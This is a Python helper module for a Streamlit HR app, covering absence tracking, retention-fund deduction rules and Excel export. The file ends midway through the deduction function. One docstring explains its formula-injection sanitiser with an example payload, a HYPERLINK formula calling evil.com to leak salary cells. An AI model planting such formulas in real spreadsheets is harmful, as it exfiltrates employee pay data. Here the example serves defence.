"""
Shared utility functions for the HR Assistant app.
Keeping all business-logic / calculation functions here (instead of inside
each page) makes the app easier to maintain and test.
"""

import io
import os
import json
from datetime import date, datetime
import pandas as pd
import streamlit as st


# --------------------------------------------------------------------------
# Navigation helpers
# --------------------------------------------------------------------------

def hide_default_sidebar_nav():
    """Hides Streamlit's automatic multipage sidebar list, so navigation is
    driven entirely by the nav cards / nav bar we render ourselves."""
    st.markdown(
        """
        <style>
        [data-testid="stSidebarNav"] {display: none;}
        </style>
        """,
        unsafe_allow_html=True,
    )


# NOTE: keep this in sync with the actual files under pages/. Every entry
# here becomes a st.page_link() call in render_top_nav() below - an entry
# pointing at a file that doesn't exist will raise an error, and an active
# page missing from this list simply won't get a nav link.
PAGES = [
    {"path": "pages/0_Login.py", "label": "Login", "icon": "🔐"},
    {"path": "Home.py", "label": "Home", "icon": "🗂️"},
    {"path": "pages/1_Long_Absence_Tracker.py", "label": "Long Absence Tracker", "icon": "📅"},
    {"path": "pages/2_Retention_Fund.py", "label": "Retention Fund", "icon": "💰"},
    {"path": "pages/3_Payroll_Calculator.py", "label": "Payroll Calculator", "icon": "🧾"},
    {"path": "pages/4_Employee_Database.py", "label": "Employee Database", "icon": "👥"},
    {"path": "pages/7_Shift_management.py", "label": "Shift Management", "icon": "🕒"},
]


def render_top_nav(active_label: str):
    """Renders a simple horizontal row of page links at the top of a page,
    used instead of the default sidebar navigation list.

    This now also shows a small user status area on the right with a logout
    button when the user is logged in."""
    hide_default_sidebar_nav()
    # extra column at the end reserved for user status / logout
    cols = st.columns(len(PAGES) + 1)
    for col, page in zip(cols[:-1], PAGES):
        with col:
            if page["label"] == active_label:
                st.markdown(f"**{page['icon']} {page['label']}**")
            else:
                st.page_link(page["path"], label=page["label"], icon=page["icon"])

    # right-most column: user status and logout
    with cols[-1]:
        if st.session_state.get("logged_in"):
            user = st.session_state.get("user")
            st.markdown(f"**👤 {user}**")
            if st.button("Logout"):
                # clear login-related session state keys (preserve app data)
                for k in ["logged_in", "user", "role"]:
                    if k in st.session_state:
                        del st.session_state[k]
                st.experimental_rerun()
        else:
            st.markdown("Not logged in")

    st.divider()


# --------------------------------------------------------------------------
# Generic helpers
# --------------------------------------------------------------------------

def read_any_table(uploaded_file) -> pd.DataFrame:
    """Read an uploaded .csv / .xlsx / .xls file, always treating the first
    row as the header row. Returns a cleaned DataFrame (strips whitespace
    from column names)."""
    if uploaded_file is None:
        return pd.DataFrame()

    name = uploaded_file.name.lower()
    if name.endswith(".csv"):
        df = pd.read_csv(uploaded_file, header=0)
    else:
        df = pd.read_excel(uploaded_file, header=0, engine="openpyxl")

    df.columns = [str(c).strip() for c in df.columns]
    return df


def to_excel_bytes(sheets: dict) -> bytes:
    """Convert a dict of {sheet_name: DataFrame} into an in-memory .xlsx file
    and return the raw bytes, ready for st.download_button.

    Every sheet is passed through `sanitize_dataframe_for_export()` first so
    that no exported file can carry a formula-injection payload (a common
    way sensitive data gets silently exfiltrated when a report is later
    re-opened in Excel/Sheets by someone else)."""
    buffer = io.BytesIO()
    with pd.ExcelWriter(buffer, engine="xlsxwriter") as writer:
        for sheet_name, df in sheets.items():
            safe_name = str(sheet_name)[:31]  # Excel sheet name limit
            sanitize_dataframe_for_export(df).to_excel(writer, index=False, sheet_name=safe_name)
    return buffer.getvalue()


def download_button_for_df(df: pd.DataFrame, label: str, file_name: str, key: str = None):
    st.download_button(
        label=label,
        data=to_excel_bytes({"Sheet1": df}),
        file_name=file_name,
        mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        key=key,
    )


# --------------------------------------------------------------------------
# Data-leak / security hardening
# --------------------------------------------------------------------------

_FORMULA_TRIGGER_CHARS = ("=", "+", "-", "@", "\t", "\r")


def sanitize_dataframe_for_export(df: pd.DataFrame) -> pd.DataFrame:
    """Neutralizes CSV/Excel formula-injection payloads before any data
    leaves the app as a downloadable file.

    If a cell value (typically from an uploaded sheet) starts with =, +, -,
    or @, Excel/Sheets will treat it as a formula when the exported file is
    reopened. A malicious cell like `=HYPERLINK("http://evil.com/"&A1,"x")`
    can silently exfiltrate adjacent salary data the moment someone opens
    the report. Prefixing such cells with a leading apostrophe forces them
    to render as plain text instead of executing.

    This only rewrites string cells that start with a trigger character —
    numbers, dates, and normal text are left untouched.
    """
    out = df.copy()
    for col in out.columns:
        if pd.api.types.is_object_dtype(out[col]) or pd.api.types.is_string_dtype(out[col]):
            out[col] = out[col].apply(
                lambda v: ("'" + v) if isinstance(v, str) and v.startswith(_FORMULA_TRIGGER_CHARS) else v
            )
    return out


def safe_error_message(exc: Exception, context: str = "processing your data") -> str:
    """Returns a generic, user-facing error message that never echoes raw
    exception text back into the UI. Exception messages can accidentally
    contain fragments of the underlying data (e.g. a bad cell value quoted
    inside a pandas/KeyError message) — showing that verbatim in st.error
    is itself a small data leak. Log `exc` server-side via your own logging
    setup if you need the details; don't display it to end users.
    """
    return f"⚠️ Something went wrong while {context}. Please check your file's columns and format and try again."


SENSITIVE_SESSION_KEYS = [
    "employee_db",
    "fulltime_data",
    "payroll_result",
    "gig_data",
    "gig_result",
    "retention_fund_data",
    "retention_result",
    "consolidated_paysheets",
    "consolidated_paysheet_result",
    "consolidated_paysheet_summary",
]


def clear_sensitive_session_data():
    """Wipes all cached salary/employee data out of session_state. Streamlit
    keeps session_state in server memory for as long as the browser tab's
    session is alive — calling this lets you deliberately purge sensitive
    payroll data once you're done with it, rather than leaving it sitting
    in memory (e.g. on a shared workstation)."""
    for key in SENSITIVE_SESSION_KEYS:
        if key in st.session_state:
            del st.session_state[key]


def render_clear_data_button(label: str = "🔒 Clear cached data from this session"):
    if st.button(label):
        clear_sensitive_session_data()
        st.success("Session data cleared.")
        st.rerun()


# --------------------------------------------------------------------------
# 1. Long Absence Tracking
# --------------------------------------------------------------------------

def sample_attendance_muster() -> pd.DataFrame:
    """Small example attendance muster for download, showing the expected
    shape: employee identifier columns first (Employee ID, Employee Name,
    Branch), followed by one column per day with attendance marks
    (P=Present, A=Absent, WO=Weekly Off, L=Leave).

    This mirrors the row/column layout the Long Absence Tracker page
    expects — copy this shape when preparing your real muster."""
    days = [f"Day{i}" for i in range(1, 11)]

    rows = [
        {
            "Employee ID": "E001",
            "Employee Name": "Ravi Kumar",
            "Branch": "Koramangala",
            **dict(zip(days, ["P", "P", "A", "P", "P", "WO", "P", "A", "P", "P"])),
        },
        {
            "Employee ID": "E002",
            "Employee Name": "Sita Sharma",
            "Branch": "Koramangala",
            **dict(zip(days, ["P", "P", "P", "P", "P", "WO", "P", "P", "P", "P"])),
        },
        {
            "Employee ID": "E003",
            "Employee Name": "Mohan Das",
            "Branch": "Whitefield",
            **dict(zip(days, ["A", "A", "A", "A", "A", "WO", "A", "A", "A", "A"])),
        },
    ]
    return pd.DataFrame(rows)


def count_absences(df: pd.DataFrame, id_cols: list, absence_marker: str = "A") -> pd.DataFrame:
    """Given an attendance muster where `id_cols` identify the employee and
    all other columns are day-wise attendance marks, count how many times
    `absence_marker` (default 'A') appears for each employee."""
    day_cols = [c for c in df.columns if c not in id_cols]

    def count_row(row):
        vals = row[day_cols].astype(str).str.strip().str.upper()
        return (vals == absence_marker.upper()).sum()

    result = df[id_cols].copy()
    result["Total_Absent_Days"] = df.apply(count_row, axis=1)
    result["Total_Days_In_Muster"] = len(day_cols)
    return result


def categorize_absences(df: pd.DataFrame, thresholds: list) -> pd.DataFrame:
    """thresholds: list of (label, min_days, max_days_or_None) tuples,
    evaluated in order. max_days_or_None means "and above".
    Adds a 'Absence_Category' column to df (based on Total_Absent_Days).
    """

    def classify(days):
        for label, min_d, max_d in thresholds:
            if max_d is None:
                if days >= min_d:
                    return label
            else:
                if min_d <= days <= max_d:
                    return label
        return "Not Flagged"

    out = df.copy()
    out["Absence_Category"] = out["Total_Absent_Days"].apply(classify)
    return out


DEFAULT_ABSENCE_THRESHOLDS = [
    ("Informed Leave (3-4 days)", 3, 4),
    ("To Be Checked (5-20 days)", 5, 20),
    ("Probable Exit Case (>20 days)", 21, None),
]



# --------------------------------------------------------------------------
# 2. Retention Fund — First Hire Date based design
# --------------------------------------------------------------------------
# IMPORTANT: Everything above this section belongs to the existing shared
# util.py and is intentionally left unchanged. The helpers below are only for
# the Retention Fund module. Older public helper names/signatures are retained
# where practical so other pages that import util.py do not break.
#
# Retention deduction rules:
#   * No Internal Transfer logic.
#   * First Hire Date is the only hire-date basis.
#   * The First Hire Date calendar month itself is eligible.
#   * Deduction = min(10% of Monthly Gross, Net Pay).
#   * Customize Dashboard rules are keyed by Branch + Company Code +
#     Designation.
#   * Employment Type options: Full Time / Non-Full Time.
#   * Retention Applicable options: Yes / No.
#   * No deduction for configured Company Codes.
#   * No deduction for Exceptional ERPs.
#   * No deduction for Non-Full Time employees.
#   * No deduction when Retention Applicable = No.

# No company is silently excluded by default. Admins explicitly maintain the
# list from the Retention Fund Customize Dashboard.
DEFAULT_IGNORED_COMPANY_CODES = []

_APP_ROOT = os.path.dirname(os.path.abspath(__file__))
_DATA_DIR = os.path.join(_APP_ROOT, "..", "data")
_IGNORED_CC_FILE = os.path.join(_DATA_DIR, "ignored_company_codes.json")
_EXCEPTIONAL_ERP_FILE = os.path.join(_DATA_DIR, "exceptional_erps.json")
_CUSTOMIZE_DASHBOARD_FILE = os.path.join(_DATA_DIR, "customize_dashboard.json")

EMPLOYMENT_TYPE_OPTIONS = ["Full Time", "Non-Full Time"]
RETENTION_APPLICABLE_OPTIONS = ["Yes", "No"]

CUSTOMIZE_KEY_COLUMNS = ["Branch", "Company Code", "Designation"]
CUSTOMIZE_DASHBOARD_COLUMNS = [
    "Branch",
    "Designation",
    "Company Code",
    "Employment Type",
    "Retention Applicable",
]

CONSOLIDATED_PAYSHEET_COLUMNS = ["ERP", "First Hire Date", "Net Pay", "Monthly Gross"]
EMPLOYEE_MASTER_COLUMNS = ["ERP", "Branch", "Designation", "Company Code"]


def _retention_clean_text(value) -> str:
    if value is None:
        return ""
    try:
        if pd.isna(value):
            return ""
    except Exception:
        pass
    return str(value).strip()


def _retention_normalise_key_series(series: pd.Series) -> pd.Series:
    return series.fillna("").astype(str).str.strip().str.upper()


def normalise_retention_employment_type(value) -> str:
    """Return Full Time or Non-Full Time.

    Older saved labels such as Gig Worker, Consultant, Contractual and Part
    Time are safely migrated to Non-Full Time. Blank/unknown legacy values are
    treated as Full Time only so an existing rule can still be displayed and
    edited after upgrade.
    """
    text = _retention_clean_text(value).lower().replace("_", " ")
    text = " ".join(text.split())

    if text in {"full time", "full-time", "fulltime", "ft"}:
        return "Full Time"

    if text in {
        "non full time", "non-full time", "non-full-time", "nonfulltime",
        "gig", "gig worker", "part time", "part-time", "parttime",
        "consultant", "contractual", "contractor", "contract worker",
        "contract", "temporary", "temp",
    }:
        return "Non-Full Time"

    return "Full Time"


def normalise_retention_applicable(value, employment_type=None) -> str:
    """Return Yes/No while preserving an explicit dashboard choice.

    For migrated/blank rows only, the sensible default is Yes for Full Time
    and No for Non-Full Time. Actual computation still blocks Non-Full Time
    even if someone manually selects Yes, because Employment Type is a hard
    exclusion rule.
    """
    text = _retention_clean_text(value).lower()
    if text in {"yes", "y", "true", "1"}:
        return "Yes"
    if text in {"no", "n", "false", "0"}:
        return "No"
    return "Yes" if normalise_retention_employment_type(employment_type) == "Full Time" else "No"


def retention_applicable_from_employment_type(value) -> str:
    """Compatibility helper: default applicability for an employment type."""
    return "Yes" if normalise_retention_employment_type(value) == "Full Time" else "No"


def retention_remark_from_employment_type(value) -> str:
    """Compatibility helper used by older report code."""
    if normalise_retention_employment_type(value) == "Full Time":
        return "Retention Eligible - Full Time"
    return "No Deduction - Non-Full Time"


# --------------------------------------------------------------------------
# Company Code exclusions
# --------------------------------------------------------------------------

def load_ignored_company_codes() -> list:
    """Return Company Codes that must never have Retention Fund deducted."""
    if not os.path.exists(_IGNORED_CC_FILE):
        return list(DEFAULT_IGNORED_COMPANY_CODES)
    try:
        with open(_IGNORED_CC_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, list):
            return sorted({
                _retention_clean_text(v).upper()
                for v in data
                if _retention_clean_text(v)
            })
    except Exception:
        pass
    return list(DEFAULT_IGNORED_COMPANY_CODES)


def save_ignored_company_codes(codes: list):
    """Persist Company Codes excluded from Retention Fund deduction."""
    os.makedirs(_DATA_DIR, exist_ok=True)
    clean = sorted({
        _retention_clean_text(v).upper()
        for v in (codes or [])
        if _retention_clean_text(v)
    })
    with open(_IGNORED_CC_FILE, "w", encoding="utf-8") as f:
        json.dump(clean, f, indent=2)


def sample_ignored_company_code_bulk_template() -> pd.DataFrame:
    """One-column template for excluded Company Codes."""
    return pd.DataFrame({"Company Code": ["COMPANY_A", "COMPANY_B"]})


def merge_ignored_company_code_bulk_upload(
    existing_codes: list,
    upload_df: pd.DataFrame,
    company_code_col: str = "Company Code",
) -> list:
    """Merge a one-column Company Code upload into the exclusion list."""
    if upload_df is None or company_code_col not in upload_df.columns:
        raise ValueError("Company Code exclusion upload must contain a Company Code column.")

    uploaded = {
        _retention_clean_text(v).upper()
        for v in upload_df[company_code_col].tolist()
        if _retention_clean_text(v)
    }
    existing = {
        _retention_clean_text(v).upper()
        for v in (existing_codes or [])
        if _retention_clean_text(v)
    }
    return sorted(existing | uploaded)


# --------------------------------------------------------------------------
# Exceptional ERP exclusions
# --------------------------------------------------------------------------

def load_exceptional_erps() -> list:
    """Return ERPs that must never have Retention Fund deducted."""
    if not os.path.exists(_EXCEPTIONAL_ERP_FILE):
        return []
    try:
        with open(_EXCEPTIONAL_ERP_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, list):
            return sorted({
                _retention_clean_text(v).upper()
                for v in data
                if _retention_clean_text(v)
            })
    except Exception:
        pass
    return []


def save_exceptional_erps(erps: list):
    """Persist exceptional ERP exclusions."""
    os.makedirs(_DATA_DIR, exist_ok=True)
    clean = sorted({
        _retention_clean_text(v).upper()
        for v in (erps or [])
        if _retention_clean_text(v)
    })
    with open(_EXCEPTIONAL_ERP_FILE, "w", encoding="utf-8") as f:
        json.dump(clean, f, indent=2)


def sample_exceptional_erp_bulk_template() -> pd.DataFrame:
    """One-column template for bulk Exceptional ERP upload."""
    return pd.DataFrame({"ERP": ["ERP00123", "ERP00456"]})


def merge_exceptional_erp_bulk_upload(
    existing_erps: list,
    upload_df: pd.DataFrame,
    erp_col: str = "ERP",
) -> list:
    """Merge Exceptional ERPs from an uploaded sheet into the saved list."""
    if upload_df is None or erp_col not in upload_df.columns:
        raise ValueError("Exceptional ERP upload must contain an ERP column.")

    uploaded = {
        _retention_clean_text(v).upper()
        for v in upload_df[erp_col].tolist()
        if _retention_clean_text(v)
    }
    existing = {
        _retention_clean_text(v).upper()
        for v in (existing_erps or [])
        if _retention_clean_text(v)
    }
    return sorted(existing | uploaded)


# --------------------------------------------------------------------------
# Customize Dashboard — Branch + Company Code + Designation rule master
# --------------------------------------------------------------------------

def _prepare_customize_dashboard(df: pd.DataFrame) -> pd.DataFrame:
    """Validate and normalize the Retention Customize rule master.

    The dashboard intentionally stores only five fields:
      Branch, Designation, Company Code, Employment Type,
      Retention Applicable.

    Employment Type and Retention Applicable remain independently editable in
    the UI. Computation applies hard safety rules afterwards: Non-Full Time is
    always no deduction even if Retention Applicable was accidentally set Yes.
    """
    if df is None:
        df = pd.DataFrame(columns=CUSTOMIZE_DASHBOARD_COLUMNS)

    out = df.copy()
    for col in CUSTOMIZE_DASHBOARD_COLUMNS:
        if col not in out.columns:
            out[col] = None

    for col in ["Branch", "Designation", "Company Code"]:
        out[col] = out[col].apply(_retention_clean_text)

    out["Employment Type"] = out["Employment Type"].apply(normalise_retention_employment_type)
    out["Retention Applicable"] = out.apply(
        lambda row: normalise_retention_applicable(
            row.get("Retention Applicable"), row.get("Employment Type")
        ),
        axis=1,
    )

    valid = (
        out["Branch"].ne("")
        & out["Company Code"].ne("")
        & out["Designation"].ne("")
    )
    out = out.loc[valid, CUSTOMIZE_DASHBOARD_COLUMNS].copy()

    if out.empty:
        return pd.DataFrame(columns=CUSTOMIZE_DASHBOARD_COLUMNS)

    out["__branch_key"] = _retention_normalise_key_series(out["Branch"])
    out["__cc_key"] = _retention_normalise_key_series(out["Company Code"])
    out["__designation_key"] = _retention_normalise_key_series(out["Designation"])
    out = out.drop_duplicates(
        subset=["__branch_key", "__cc_key", "__designation_key"],
        keep="last",
    )
    out = out.drop(columns=["__branch_key", "__cc_key", "__designation_key"])
    return out.reset_index(drop=True)


def load_customize_dashboard() -> pd.DataFrame:
    """Load the Retention Customize rule master.

    Older saved rows are automatically migrated: Gig Worker / Consultant /
    Contractual / Part Time become Non-Full Time, and any old extra columns
    are ignored without breaking the file.
    """
    if not os.path.exists(_CUSTOMIZE_DASHBOARD_FILE):
        return pd.DataFrame(columns=CUSTOMIZE_DASHBOARD_COLUMNS)
    try:
        with open(_CUSTOMIZE_DASHBOARD_FILE, "r", encoding="utf-8") as f:
            records = json.load(f)
        return _prepare_customize_dashboard(pd.DataFrame(records))
    except Exception:
        return pd.DataFrame(columns=CUSTOMIZE_DASHBOARD_COLUMNS)


def save_customize_dashboard(df: pd.DataFrame):
    """Persist the Retention Customize rule master."""
    os.makedirs(_DATA_DIR, exist_ok=True)
    out = _prepare_customize_dashboard(df)
    with open(_CUSTOMIZE_DASHBOARD_FILE, "w", encoding="utf-8") as f:
        json.dump(out.to_dict(orient="records"), f, indent=2, default=str)


def sample_customize_dashboard_bulk_template() -> pd.DataFrame:
    """Bulk upload contains only Branch, Company Code and Designation."""
    return pd.DataFrame(
        [
            {"Branch": "Koramangala", "Company Code": "MAIN", "Designation": "Teacher"},
            {"Branch": "Whitefield", "Company Code": "MAIN", "Designation": "Principal"},
        ]
    )


def merge_customize_dashboard_bulk_upload(
    existing_df: pd.DataFrame,
    upload_df: pd.DataFrame,
    erp_col: str = None,
    branch_col: str = "Branch",
    cc_col: str = "Company Code",
    designation_col: str = "Designation",
) -> pd.DataFrame:
    """Merge a three-column upload into the Customize rule master.

    `erp_col` stays in the signature for compatibility with older callers but
    is intentionally unused. Existing rules preserve their editable
    Employment Type / Retention Applicable values. New rules default to
    Full Time / Yes and can then be changed from the dropdown table.
    """
    if upload_df is None:
        raise ValueError("Customize upload is empty.")

    required = [branch_col, cc_col, designation_col]
    missing = [c for c in required if c not in upload_df.columns]
    if missing:
        raise ValueError(f"Customize upload is missing required column(s): {', '.join(missing)}")

    existing = _prepare_customize_dashboard(existing_df)
    existing_map = {}
    for _, row in existing.iterrows():
        key = (
            _retention_clean_text(row["Branch"]).upper(),
            _retention_clean_text(row["Company Code"]).upper(),
            _retention_clean_text(row["Designation"]).upper(),
        )
        existing_map[key] = row.to_dict()

    rows = []
    for _, row in upload_df.iterrows():
        branch = _retention_clean_text(row.get(branch_col))
        company_code = _retention_clean_text(row.get(cc_col))
        designation = _retention_clean_text(row.get(designation_col))
        if not branch or not company_code or not designation:
            continue

        key = (branch.upper(), company_code.upper(), designation.upper())
        prior = existing_map.get(key, {})
        employment_type = normalise_retention_employment_type(
            prior.get("Employment Type") or "Full Time"
        )
        retention_applicable = normalise_retention_applicable(
            prior.get("Retention Applicable"), employment_type
        )
        rows.append(
            {
                "Branch": branch,
                "Designation": designation,
                "Company Code": company_code,
                "Employment Type": employment_type,
                "Retention Applicable": retention_applicable,
            }
        )

    uploaded = pd.DataFrame(rows, columns=CUSTOMIZE_DASHBOARD_COLUMNS)
    if uploaded.empty:
        return existing

    def _add_key(frame):
        frame = frame.copy()
        frame["__key"] = list(
            zip(
                _retention_normalise_key_series(frame["Branch"]),
                _retention_normalise_key_series(frame["Company Code"]),
                _retention_normalise_key_series(frame["Designation"]),
            )
        )
        return frame

    old = _add_key(existing)
    new = _add_key(uploaded)
    new_keys = set(new["__key"].tolist())
    untouched = old.loc[~old["__key"].isin(new_keys)].drop(columns="__key")
    new = new.drop(columns="__key")
    return _prepare_customize_dashboard(pd.concat([untouched, new], ignore_index=True))


def upsert_customize_dashboard_rule(
    existing_df: pd.DataFrame,
    branch: str,
    designation: str,
    company_code: str,
    employment_type: str = "Full Time",
    retention_applicable: str = "Yes",
) -> pd.DataFrame:
    """Add or update one Branch + Company Code + Designation rule."""
    branch = _retention_clean_text(branch)
    designation = _retention_clean_text(designation)
    company_code = _retention_clean_text(company_code)
    if not branch or not designation or not company_code:
        raise ValueError("Branch, Designation and Company Code are required.")

    one = pd.DataFrame(
        [
            {
                "Branch": branch,
                "Designation": designation,
                "Company Code": company_code,
                "Employment Type": normalise_retention_employment_type(employment_type),
                "Retention Applicable": normalise_retention_applicable(
                    retention_applicable, employment_type
                ),
            }
        ]
    )

    existing = _prepare_customize_dashboard(existing_df)
    combined = pd.concat([existing, one], ignore_index=True)
    return _prepare_customize_dashboard(combined)


# --------------------------------------------------------------------------
# Payroll cycle helper — retained for compatibility with other modules.
# Retention Fund itself does NOT use this helper for eligibility.
# --------------------------------------------------------------------------

def get_payroll_cycle(reference_date=None) -> tuple:
    """Returns (cycle_start, cycle_end) for the 26th -> 25th payroll cycle."""
    if reference_date is None:
        reference_date = date.today()
    if isinstance(reference_date, datetime):
        reference_date = reference_date.date()

    if reference_date.day >= 26:
        cycle_start = date(reference_date.year, reference_date.month, 26)
        end_month = reference_date.month + 1
        end_year = reference_date.year
        if end_month > 12:
            end_month = 1
            end_year += 1
        cycle_end = date(end_year, end_month, 25)
    else:
        start_month = reference_date.month - 1
        start_year = reference_date.year
        if start_month < 1:
            start_month = 12
            start_year -= 1
        cycle_start = date(start_year, start_month, 26)
        cycle_end = date(reference_date.year, reference_date.month, 25)

    return cycle_start, cycle_end


def format_date_ddmmmyyyy(value) -> str:
    """Format a date-like value as dd-mmm-yyyy; blank for invalid values."""
    if value is None:
        return ""
    try:
        if isinstance(value, float) and pd.isna(value):
            return ""
        dt_value = pd.to_datetime(value)
        if pd.isna(dt_value):
            return ""
        return dt_value.strftime("%d-%b-%Y")
    except Exception:
        return ""


def pending_deduction_sentence(label: str, pending_df: pd.DataFrame, name_col: str) -> str:
    """Human-readable pending deduction summary."""
    count = len(pending_df)
    if count == 0:
        return f"**{label}**: No deductions pending."
    if count == 1:
        emp_name = pending_df.iloc[0][name_col] if name_col in pending_df.columns else "employee"
        return f"**{label}**: 1 deduction pending with employee {emp_name}."
    return f"**{label}**: {count} deductions pending."


# --------------------------------------------------------------------------
# Numeric coercion (same public helper retained)
# --------------------------------------------------------------------------

def coerce_numeric_column(series: pd.Series, column_name: str = "value") -> pd.Series:
    """Clean currency/text-formatted numeric columns and validate bad cells."""
    if pd.api.types.is_numeric_dtype(series):
        return pd.to_numeric(series, errors="coerce")

    cleaned = series.astype(str).str.replace(r"[₹$,\s]", "", regex=True).str.strip()
    cleaned = cleaned.replace({"": None, "nan": None, "None": None, "NaT": None})
    numeric = pd.to_numeric(cleaned, errors="coerce")

    original_nonblank = series.notna() & series.astype(str).str.strip().ne("")
    bad_mask = numeric.isna() & original_nonblank
    if bad_mask.any():
        bad_rows = series[bad_mask]
        examples = ", ".join(f"row {i + 2}: '{v}'" for i, v in bad_rows.head(5).items())
        more = f" (+{bad_mask.sum() - 5} more)" if bad_mask.sum() > 5 else ""
        raise ValueError(
            f"Column '{column_name}' has {bad_mask.sum()} value(s) that are not valid numbers — "
            f"e.g. {examples}{more}. Please fix these cells and re-upload."
        )
    return numeric


# --------------------------------------------------------------------------
# Consolidated Paysheet templates / employee-master enrichment
# --------------------------------------------------------------------------

def sample_consolidated_paysheet_template() -> pd.DataFrame:
    """Required monthly paysheet format."""
    return pd.DataFrame(
        [
            {"ERP": "E001", "First Hire Date": "2020-01-15", "Net Pay": 21000, "Monthly Gross": 25000},
            {"ERP": "E002", "First Hire Date": "2021-06-10", "Net Pay": 31000, "Monthly Gross": 35000},
            {"ERP": "E003", "First Hire Date": "2024-09-20", "Net Pay": 36000, "Monthly Gross": 40000},
        ]
    )


def _retention_resolve_column(df: pd.DataFrame, aliases: list):
    """Resolve a column using exact normalized aliases first, then substrings."""
    if df is None or df.empty:
        return None

    normalized = {str(c).strip().lower(): c for c in df.columns}
    for alias in aliases:
        key = str(alias).strip().lower()
        if key in normalized:
            return normalized[key]

    for col in df.columns:
        col_key = str(col).strip().lower()
        for alias in aliases:
            alias_key = str(alias).strip().lower()
            if alias_key and alias_key in col_key:
                return col
    return None


def normalise_employee_master(employee_master: pd.DataFrame = None) -> pd.DataFrame:
    """Map the Employee Database to ERP/Branch/Designation/Company Code."""
    if employee_master is None or employee_master.empty:
        return pd.DataFrame(columns=EMPLOYEE_MASTER_COLUMNS)

    aliases = {
        "ERP": [
            "ERP", "Employee ID", "Employee Id", "Employee Code", "Emp Code",
            "EmployeeCode", "Emp ID", "ERP Code",
        ],
        "Branch": [
            "Branch", "Current Branch", "Curr.Branch", "Curr Branch", "Branch Name",
            "Location", "Current Location",
        ],
        "Designation": [
            "Designation", "Current Designation", "Curr.Designation", "Curr Designation",
            "Role", "Job Title", "Position",
        ],
        "Company Code": [
            "Company Code", "CompanyCode", "Comp Code", "Company", "Company_Code",
            "Entity Code",
        ],
    }

    resolved = {
        name: _retention_resolve_column(employee_master, options)
        for name, options in aliases.items()
    }
    missing = [name for name, source in resolved.items() if source is None]
    if missing:
        return pd.DataFrame(columns=EMPLOYEE_MASTER_COLUMNS)

    out = employee_master[[resolved[c] for c in EMPLOYEE_MASTER_COLUMNS]].copy()
    out.columns = EMPLOYEE_MASTER_COLUMNS
    out["ERP"] = out["ERP"].apply(_retention_clean_text)
    for col in ["Branch", "Designation", "Company Code"]:
        out[col] = out[col].apply(_retention_clean_text)
    out = out.loc[out["ERP"].ne("")]

    out["__erp_key"] = _retention_normalise_key_series(out["ERP"])
    out = out.drop_duplicates(subset=["__erp_key"], keep="last")
    return out.drop(columns="__erp_key").reset_index(drop=True)


def _attach_employee_profile(
    paysheet: pd.DataFrame,
    erp_col: str,
    employee_master: pd.DataFrame = None,
) -> pd.DataFrame:
    out = paysheet.copy()
    out[erp_col] = out[erp_col].apply(_retention_clean_text)
    profile_columns = ["Branch", "Designation", "Company Code"]

    # If source data already contains profile columns, keep them and only fill
    # blanks from the central Employee Database.
    for col in profile_columns:
        if col not in out.columns:
            out[col] = ""
        out[col] = out[col].apply(_retention_clean_text)

    master = normalise_employee_master(employee_master)
    if not master.empty:
        master = master.copy()
        master["__erp_key"] = _retention_normalise_key_series(master["ERP"])
        master = master.drop_duplicates("__erp_key", keep="last").set_index("__erp_key")

        erp_keys = _retention_normalise_key_series(out[erp_col])
        for col in profile_columns:
            mapped = erp_keys.map(master[col])
            blank = out[col].eq("")
            out.loc[blank, col] = mapped.loc[blank].fillna("")

    out["Employee Master Mapping Missing"] = (
        out["Branch"].eq("")
        | out["Designation"].eq("")
        | out["Company Code"].eq("")
    )
    return out


def _attach_customize_rule(
    out: pd.DataFrame,
    customize_dashboard: pd.DataFrame = None,
) -> pd.DataFrame:
    rules = _prepare_customize_dashboard(customize_dashboard)
    result = out.copy()

    result["__branch_key"] = _retention_normalise_key_series(result["Branch"])
    result["__cc_key"] = _retention_normalise_key_series(result["Company Code"])
    result["__designation_key"] = _retention_normalise_key_series(result["Designation"])

    if rules.empty:
        result["Employment Type"] = None
        result["Retention Applicable"] = None
        result["Customize Rule Matched"] = False
        return result.drop(columns=["__branch_key", "__cc_key", "__designation_key"])

    rules = rules.copy()
    rules["__branch_key"] = _retention_normalise_key_series(rules["Branch"])
    rules["__cc_key"] = _retention_normalise_key_series(rules["Company Code"])
    rules["__designation_key"] = _retention_normalise_key_series(rules["Designation"])
    rules["Customize Rule Matched"] = True

    rule_columns = [
        "__branch_key",
        "__cc_key",
        "__designation_key",
        "Employment Type",
        "Retention Applicable",
        "Customize Rule Matched",
    ]
    result = result.merge(
        rules[rule_columns],
        on=["__branch_key", "__cc_key", "__designation_key"],
        how="left",
    )
    result["Customize Rule Matched"] = result["Customize Rule Matched"].eq(True)
    return result.drop(columns=["__branch_key", "__cc_key", "__designation_key"])


# --------------------------------------------------------------------------
# Core Retention Fund computation
# --------------------------------------------------------------------------

def compute_paysheet_deduction(
    df: pd.DataFrame,
    erp_col: str,
    first_hire_col: str,
    net_pay_col: str,
    gross_col: str,
    paysheet_month,
    exceptional_erps: list = None,
    customize_dashboard: pd.DataFrame = None,
    deduction_pct: float = 10.0,
    employee_master: pd.DataFrame = None,
    ignored_company_codes: list = None,
) -> pd.DataFrame:
    """Compute Retention Fund for one monthly paysheet.

    The `ignored_company_codes` argument is appended at the end so older
    callers using the previous function signature continue to work.

    Deduction is allowed only when ALL are true:
      * valid First Hire Date and paysheet month is on/after First Hire month
      * ERP is not Exceptional
      * mapped Company Code is not in the excluded Company Code list
      * Branch + Company Code + Designation has a Customize rule
      * Employment Type = Full Time
      * Retention Applicable = Yes
      * Monthly Gross and Net Pay are valid non-negative numbers
    """
    required = [erp_col, first_hire_col, net_pay_col, gross_col]
    missing = [c for c in required if c not in df.columns]
    if missing:
        raise ValueError(f"Paysheet is missing required column(s): {', '.join(missing)}")

    if float(deduction_pct) != 10.0:
        raise ValueError("Retention Fund deduction percentage must be exactly 10%.")

    out = df.copy()
    out[erp_col] = out[erp_col].apply(_retention_clean_text)
    if out[erp_col].eq("").any():
        raise ValueError("ERP cannot be blank in a paysheet.")

    erp_key = out[erp_col].str.upper()
    if erp_key.duplicated().any():
        duplicates = out.loc[
            erp_key.duplicated(keep=False), erp_col
        ].astype(str).head(10).tolist()
        raise ValueError(
            "Duplicate ERP(s) found in the same monthly paysheet: " + ", ".join(duplicates)
        )

    out[gross_col] = coerce_numeric_column(out[gross_col], gross_col)
    out[net_pay_col] = coerce_numeric_column(out[net_pay_col], net_pay_col)

